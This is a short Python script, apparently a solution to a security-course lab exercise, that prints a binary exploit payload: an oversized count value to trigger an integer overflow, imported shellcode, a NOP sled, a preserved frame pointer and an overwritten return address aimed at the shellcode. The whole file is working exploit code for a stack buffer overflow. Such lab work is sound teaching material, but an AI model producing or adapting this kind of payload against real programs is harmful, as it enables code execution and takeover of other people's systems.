#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<I",0x80000006)) #count = max_int
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x90"*17)
sys.stdout.buffer.write(pack("<I",0xfffeb534)) #keep ebp the same
sys.stdout.buffer.write(pack("<I",0xfffeb500)) #address of shell code